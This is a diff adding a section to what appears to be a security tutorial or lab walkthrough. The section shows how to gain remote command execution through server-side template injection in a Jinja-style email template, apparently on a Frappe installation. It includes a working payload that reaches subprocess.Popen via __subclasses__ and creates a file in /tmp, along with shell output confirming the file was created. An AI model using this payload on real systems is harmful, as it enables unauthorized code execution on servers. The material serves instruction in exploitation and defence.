@@ -339,3 +339,21 @@ We can find the `subprocess` class on line `421` (your result might vary). Let's
 Rendering this function returns the `subprocess.Popen` class.
 
 #### Gaining Remote Command Execution
+To do this, we craft a Server-Side Template Injection (SSTI) payload using `subclasses()` to access `subprocess.Popen`. As a proof of concept, we execute the `touch` command to create a file in `/tmp/`. 
+```python
+{% set string = "ssti" %}
+{% set class = "__class__" %}
+{% set mro = "__mro__" %}
+{% set subclasses = "__subclasses__" %}
+
+{% set mro_r = string|attr(class)|attr(mro) %}
+{% set subclasses_r = mro_r[1]|attr(subclasses)() %}
+{{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
+```
+This payload is inserted into an email template. When the template is rendered, it triggers code execution but returns only a `Popen` object—not output.
+
+Using SSH, we verify that the file was created:
+```bash
+frappe@ubuntu:~$ ls -lh /tmp/das-ist-walter 
+-rw-rw-r-- 1 frappe frappe 0 Jan 11 10:31 das-ist-walter
+```
